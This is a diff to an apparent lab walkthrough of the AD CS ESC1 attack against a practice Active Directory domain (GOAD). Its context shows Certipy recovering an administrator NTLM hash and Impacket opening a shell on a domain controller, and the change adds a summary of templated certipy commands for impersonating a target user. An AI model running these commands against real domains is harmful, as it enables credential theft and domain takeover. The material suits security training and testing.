@@ -41,7 +41,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
 ```
 
-We can also authenticate to a domain controller using the TGT saved. This requires the DC/domain to be resolved using DNS:
+We can also authenticate to a domain controller using the TGT saved. This requires the DC to be resolved using DNS:
 
 ```bash
 garffff@garffff:~/GOAD/adcs/esc1$ ls administrator.*
@@ -54,6 +54,13 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [!] Launching semi-interactive shell - Careful what you execute
 [!] Press help for extra shell commands
 C:\>
+```
+
+Summary
+
+```bash
+certipy req -u <user>@<domain> -p '<password>' -template <template> -ca <ca> -upn <target_user>@<domain -dc-ip <adcs_ip>
+certipy auth -pfx <target_user>.pfx -dc-ip <dc_ip>
 ```
 
 
